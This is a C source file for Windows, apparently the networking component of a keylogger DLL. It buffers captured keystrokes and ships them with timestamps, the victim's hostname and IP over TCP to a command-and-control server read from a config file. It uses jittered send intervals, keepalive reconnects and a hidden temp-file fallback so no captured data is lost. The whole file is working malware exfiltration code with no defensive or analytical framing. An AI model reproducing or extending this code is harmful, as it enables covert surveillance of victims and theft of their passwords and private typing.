#include <WinSock2.h>
#include <WS2tcpip.h>
#include <MSWSock.h>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include "network.h"
#include "../Common/constants.h"

#pragma comment(lib, "ws2_32.lib")

// --- Ring buffer ---
static KeyEvent g_ringBuffer[RING_BUFFER_CAPACITY];
static int g_writeIdx = 0;
static int g_readIdx = 0;
static int g_count = 0;
static CRITICAL_SECTION g_csRingBuffer;

// --- Socket ---
static SOCKET g_sock = INVALID_SOCKET;

// --- Sender thread ---
static HANDLE g_hSenderThread = NULL;
static HANDLE g_hStopEvent = NULL;   // Manual-reset: signals shutdown
static HANDLE g_hFlushEvent = NULL;  // Auto-reset: signals buffer threshold

// --- Cached metadata ---
static char g_cachedIP[16] = "0.0.0.0";
static char g_cachedHostname[256] = "UNKNOWN";

// --- C2 config ---
static char g_c2IP[64] = C2_DEFAULT_IP;
static int  g_c2Port = C2_DEFAULT_PORT;

// --- State ---
static bool g_networkInitialized = false;

// --- Forward declarations ---
static DWORD WINAPI SenderThread(LPVOID lpParam);
static void FlushBuffer(void);
static bool ConnectToC2(void);
static void ReadConfig(HMODULE hDllModule);
static void WriteFallback(const char* data, int len);
static void SendFallback(void);
static int  CalcJitteredInterval(int baseMs, double jitterRatio);
static void FormatTimestamp(const SYSTEMTIME* st, char* buf, int bufSize);

// ============================================================================
// Public API
// ============================================================================

bool InitNetwork(HMODULE hDllModule) {
    if (g_networkInitialized) {
        return true;
    }

    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return false;
    }

    // Seed random number generator for jitter calculation
    srand((unsigned int)GetTickCount());

    // Read C2 server config from config.ini
    ReadConfig(hDllModule);

    // Cache hostname (doesn't change during session)
    DWORD hostnameSize = sizeof(g_cachedHostname);
    if (!GetComputerNameA(g_cachedHostname, &hostnameSize)) {
        strcpy_s(g_cachedHostname, "UNKNOWN");
    }

    // Create synchronization objects
    g_hStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);   // Manual-reset
    g_hFlushEvent = CreateEvent(NULL, FALSE, FALSE, NULL);  // Auto-reset
    if (g_hStopEvent == NULL || g_hFlushEvent == NULL) {
        WSACleanup();
        return false;
    }

    InitializeCriticalSection(&g_csRingBuffer);

    // Reset ring buffer state
    g_writeIdx = 0;
    g_readIdx = 0;
    g_count = 0;

    // Attempt initial connection (non-fatal if fails)
    ConnectToC2();

    // Start sender thread
    g_hSenderThread = CreateThread(NULL, 0, SenderThread, NULL, 0, NULL);
    if (g_hSenderThread == NULL) {
        DeleteCriticalSection(&g_csRingBuffer);
        CloseHandle(g_hStopEvent);
        CloseHandle(g_hFlushEvent);
        if (g_sock != INVALID_SOCKET) {
            closesocket(g_sock);
            g_sock = INVALID_SOCKET;
        }
        WSACleanup();
        return false;
    }

    g_networkInitialized = true;
    return true;
}

void BufferKeyEvent(int vkCode) {
    if (!g_networkInitialized) {
        return;
    }

    SYSTEMTIME st;
    GetLocalTime(&st);

    EnterCriticalSection(&g_csRingBuffer);

    // Write entry to ring buffer
    g_ringBuffer[g_writeIdx].captureTime = st;
    g_ringBuffer[g_writeIdx].vkCode = vkCode;
    g_writeIdx = (g_writeIdx + 1) % RING_BUFFER_CAPACITY;

    if (g_count == RING_BUFFER_CAPACITY) {
        // Buffer full: overwrite oldest entry
        g_readIdx = (g_readIdx + 1) % RING_BUFFER_CAPACITY;
    } else {
        g_count++;
    }

    // Signal flush if buffer exceeds threshold
    if (g_count >= FLUSH_COUNT_THRESHOLD) {
        SetEvent(g_hFlushEvent);
    }

    LeaveCriticalSection(&g_csRingBuffer);
}

void CleanupNetwork() {
    if (!g_networkInitialized) {
        return;
    }

    g_networkInitialized = false;

    // Signal sender thread to stop
    SetEvent(g_hStopEvent);

    // Wait for sender thread to finish (includes final flush)
    if (g_hSenderThread != NULL) {
        WaitForSingleObject(g_hSenderThread, 10000);
        CloseHandle(g_hSenderThread);
        g_hSenderThread = NULL;
    }

    // Cleanup synchronization
    if (g_hStopEvent) { CloseHandle(g_hStopEvent); g_hStopEvent = NULL; }
    if (g_hFlushEvent) { CloseHandle(g_hFlushEvent); g_hFlushEvent = NULL; }
    DeleteCriticalSection(&g_csRingBuffer);

    // Close socket
    if (g_sock != INVALID_SOCKET) {
        closesocket(g_sock);
        g_sock = INVALID_SOCKET;
    }

    WSACleanup();
}

bool IsNetworkReady() {
    return g_networkInitialized;
}

// ============================================================================
// Sender Thread
// ============================================================================

static DWORD WINAPI SenderThread(LPVOID lpParam) {
    HANDLE waitHandles[2] = { g_hStopEvent, g_hFlushEvent };

    while (true) {
        int jitteredMs = CalcJitteredInterval(FLUSH_BASE_INTERVAL_MS, FLUSH_JITTER_RATIO);
        DWORD waitResult = WaitForMultipleObjects(2, waitHandles, FALSE, (DWORD)jitteredMs);

        if (waitResult == WAIT_OBJECT_0) {
            // Stop event signaled
            break;
        }

        // Flush event signaled (WAIT_OBJECT_0 + 1) or timeout (WAIT_TIMEOUT)
        FlushBuffer();
    }

    // Final flush before thread exits
    FlushBuffer();
    return 0;
}

// ============================================================================
// Flush Logic
// ============================================================================

static void FlushBuffer(void) {
    // --- Step 1: Copy entries from ring buffer under lock ---
    EnterCriticalSection(&g_csRingBuffer);

    int entryCount = g_count;
    if (entryCount == 0) {
        LeaveCriticalSection(&g_csRingBuffer);
        return;
    }

    // Copy entries to local array
    KeyEvent* localEntries = (KeyEvent*)malloc(entryCount * sizeof(KeyEvent));
    if (localEntries == NULL) {
        LeaveCriticalSection(&g_csRingBuffer);
        return;
    }

    for (int i = 0; i < entryCount; i++) {
        int idx = (g_readIdx + i) % RING_BUFFER_CAPACITY;
        localEntries[i] = g_ringBuffer[idx];
    }

    // Reset ring buffer
    g_readIdx = g_writeIdx;
    g_count = 0;

    LeaveCriticalSection(&g_csRingBuffer);

    // --- Step 2: Format messages ---
    // Each formatted line: "YYYY-MM-DD HH:MM:SS|ip|hostname|VK=0xXX\n"
    // Max ~80 bytes per line. Allocate generously.
    int sendBufSize = entryCount * 80 + 1;
    char* sendBuf = (char*)malloc(sendBufSize);
    if (sendBuf == NULL) {
        free(localEntries);
        return;
    }

    int offset = 0;
    char timestamp[20];

    for (int i = 0; i < entryCount; i++) {
        FormatTimestamp(&localEntries[i].captureTime, timestamp, sizeof(timestamp));
        int written = sprintf_s(
            sendBuf + offset,
            sendBufSize - offset,
            "%s|%s|%s|VK=0x%02X\n",
            timestamp,
            g_cachedIP,
            g_cachedHostname,
            localEntries[i].vkCode
        );
        if (written > 0) {
            offset += written;
        }
    }

    free(localEntries);

    if (offset == 0) {
        free(sendBuf);
        return;
    }

    // --- Step 3: Split into chunks <= SEND_BUFFER_MAX at \n boundaries and send ---
    bool allSent = true;
    int pos = 0;

    while (pos < offset) {
        // Find chunk boundary: up to SEND_BUFFER_MAX bytes, ending at \n
        int chunkEnd = pos + SEND_BUFFER_MAX;
        if (chunkEnd > offset) {
            chunkEnd = offset;
        }

        // Walk back to find last \n within chunk
        if (chunkEnd < offset) {
            int lastNewline = chunkEnd;
            while (lastNewline > pos && sendBuf[lastNewline - 1] != '\n') {
                lastNewline--;
            }
            if (lastNewline > pos) {
                chunkEnd = lastNewline;
            }
            // If no \n found in chunk, send the whole chunk (shouldn't happen with our format)
        }

        int chunkLen = chunkEnd - pos;

        // Ensure connection
        if (g_sock == INVALID_SOCKET) {
            ConnectToC2();
        }

        // Send chunk
        if (g_sock != INVALID_SOCKET) {
            int result = send(g_sock, sendBuf + pos, chunkLen, 0);
            if (result == SOCKET_ERROR) {
                // Send failed: save to fallback, close socket
                WriteFallback(sendBuf + pos, chunkLen);
                closesocket(g_sock);
                g_sock = INVALID_SOCKET;
                allSent = false;

                // Write remaining unsent data to fallback
                if (chunkEnd < offset) {
                    WriteFallback(sendBuf + chunkEnd, offset - chunkEnd);
                }
                break;
            }
        } else {
            // Not connected: save everything to fallback
            WriteFallback(sendBuf + pos, offset - pos);
            allSent = false;
            break;
        }

        pos = chunkEnd;
    }

    free(sendBuf);

    // --- Step 4: If all sent successfully, try to send fallback data ---
    if (allSent) {
        SendFallback();
    }
}

// ============================================================================
// Socket Management
// ============================================================================

static bool ConnectToC2(void) {
    // Close existing socket if any
    if (g_sock != INVALID_SOCKET) {
        closesocket(g_sock);
        g_sock = INVALID_SOCKET;
    }

    // Create socket
    g_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (g_sock == INVALID_SOCKET) {
        return false;
    }

    // Connect to C2 server
    struct sockaddr_in serverAddr;
    ZeroMemory(&serverAddr, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons((u_short)g_c2Port);
    inet_pton(AF_INET, g_c2IP, &serverAddr.sin_addr);

    if (connect(g_sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(g_sock);
        g_sock = INVALID_SOCKET;
        return false;
    }

    // Enable SO_KEEPALIVE
    BOOL keepAlive = TRUE;
    setsockopt(g_sock, SOL_SOCKET, SO_KEEPALIVE, (const char*)&keepAlive, sizeof(keepAlive));

    // Set keepalive parameters via WSAIoctl
    struct tcp_keepalive kaSettings;
    kaSettings.onoff = 1;
    kaSettings.keepalivetime = KEEPALIVE_IDLE_MS;       // 30 seconds idle
    kaSettings.keepaliveinterval = KEEPALIVE_INTERVAL_MS; // 5 seconds between probes
    DWORD bytesReturned = 0;
    WSAIoctl(g_sock, SIO_KEEPALIVE_VALS, &kaSettings, sizeof(kaSettings),
             NULL, 0, &bytesReturned, NULL, NULL);

    // Cache local IP from connected socket
    struct sockaddr_in localAddr;
    int addrLen = sizeof(localAddr);
    if (getsockname(g_sock, (struct sockaddr*)&localAddr, &addrLen) == 0) {
        inet_ntop(AF_INET, &localAddr.sin_addr, g_cachedIP, sizeof(g_cachedIP));
    }

    return true;
}

// ============================================================================
// Config File
// ============================================================================

static void ReadConfig(HMODULE hDllModule) {
    // Get DLL directory
    char dllPath[MAX_PATH];
    DWORD pathLen = GetModuleFileNameA(hDllModule, dllPath, MAX_PATH);
    if (pathLen == 0 || pathLen >= MAX_PATH) {
        return;  // Use defaults
    }

    // Strip filename to get directory
    char* lastSlash = strrchr(dllPath, '\\');
    if (lastSlash) {
        *lastSlash = '\0';
    }

    // Build config file path
    char configPath[MAX_PATH];
    sprintf_s(configPath, MAX_PATH, "%s\\%s", dllPath, CONFIG_FILE_NAME);

    // Open config file
    FILE* configFile = NULL;
    errno_t err = fopen_s(&configFile, configPath, "r");
    if (err != 0 || configFile == NULL) {
        return;  // Use defaults
    }

    // Parse key=value lines
    char line[256];
    while (fgets(line, sizeof(line), configFile) != NULL) {
        // Remove trailing newline/carriage return
        size_t len = strlen(line);
        while (len > 0 && (line[len - 1] == '\n' || line[len - 1] == '\r')) {
            line[--len] = '\0';
        }

        // Skip empty lines and comments
        if (len == 0 || line[0] == '#' || line[0] == ';') {
            continue;
        }

        // Find '=' separator
        char* eq = strchr(line, '=');
        if (eq == NULL) {
            continue;
        }

        *eq = '\0';
        char* key = line;
        char* value = eq + 1;

        if (_stricmp(key, "C2_IP") == 0 && strlen(value) > 0) {
            strcpy_s(g_c2IP, sizeof(g_c2IP), value);
        } else if (_stricmp(key, "C2_PORT") == 0 && strlen(value) > 0) {
            int port = atoi(value);
            if (port > 0 && port <= 65535) {
                g_c2Port = port;
            }
        }
    }

    fclose(configFile);
}

// ============================================================================
// Fallback File
// ============================================================================

static void WriteFallback(const char* data, int len) {
    if (data == NULL || len <= 0) {
        return;
    }

    char tempPath[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tempPath) == 0) {
        return;
    }

    char fallbackPath[MAX_PATH];
    sprintf_s(fallbackPath, MAX_PATH, "%s%s", tempPath, FALLBACK_FILE_NAME);

    FILE* f = NULL;
    errno_t err = fopen_s(&f, fallbackPath, "a");
    if (err != 0 || f == NULL) {
        return;
    }

    fwrite(data, 1, len, f);
    fflush(f);
    fclose(f);
}

static void SendFallback(void) {
    if (g_sock == INVALID_SOCKET) {
        return;
    }

    char tempPath[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tempPath) == 0) {
        return;
    }

    char fallbackPath[MAX_PATH];
    sprintf_s(fallbackPath, MAX_PATH, "%s%s", tempPath, FALLBACK_FILE_NAME);

    // Check if fallback file exists
    DWORD fileAttr = GetFileAttributesA(fallbackPath);
    if (fileAttr == INVALID_FILE_ATTRIBUTES) {
        return;  // No fallback file
    }

    // Read fallback file
    FILE* f = NULL;
    errno_t err = fopen_s(&f, fallbackPath, "r");
    if (err != 0 || f == NULL) {
        return;
    }

    // Get file size
    fseek(f, 0, SEEK_END);
    long fileSize = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (fileSize <= 0) {
        fclose(f);
        DeleteFileA(fallbackPath);
        return;
    }

    char* fileData = (char*)malloc(fileSize + 1);
    if (fileData == NULL) {
        fclose(f);
        return;
    }

    size_t bytesRead = fread(fileData, 1, fileSize, f);
    fclose(f);
    fileData[bytesRead] = '\0';

    // Send fallback data in chunks
    bool allSent = true;
    int pos = 0;
    int total = (int)bytesRead;

    while (pos < total) {
        int chunkEnd = pos + SEND_BUFFER_MAX;
        if (chunkEnd > total) {
            chunkEnd = total;
        }

        // Find last \n within chunk
        if (chunkEnd < total) {
            int lastNewline = chunkEnd;
            while (lastNewline > pos && fileData[lastNewline - 1] != '\n') {
                lastNewline--;
            }
            if (lastNewline > pos) {
                chunkEnd = lastNewline;
            }
        }

        int chunkLen = chunkEnd - pos;
        int result = send(g_sock, fileData + pos, chunkLen, 0);
        if (result == SOCKET_ERROR) {
            allSent = false;
            break;
        }

        pos = chunkEnd;
    }

    free(fileData);

    if (allSent) {
        DeleteFileA(fallbackPath);
    }
    // If not all sent, the file remains for next attempt
}

// ============================================================================
// Utilities
// ============================================================================

static void FormatTimestamp(const SYSTEMTIME* st, char* buf, int bufSize) {
    sprintf_s(buf, bufSize, "%04d-%02d-%02d %02d:%02d:%02d",
              st->wYear, st->wMonth, st->wDay,
              st->wHour, st->wMinute, st->wSecond);
}

static int CalcJitteredInterval(int baseMs, double jitterRatio) {
    // Range: baseMs * (1 - jitterRatio) to baseMs * (1 + jitterRatio)
    double jitter = baseMs * jitterRatio;
    double minMs = baseMs - jitter;
    double maxMs = baseMs + jitter;

    // Random value in [minMs, maxMs]
    double range = maxMs - minMs;
    double randomFactor = (double)rand() / (double)RAND_MAX;  // 0.0 ~ 1.0
    return (int)(minMs + randomFactor * range);
}
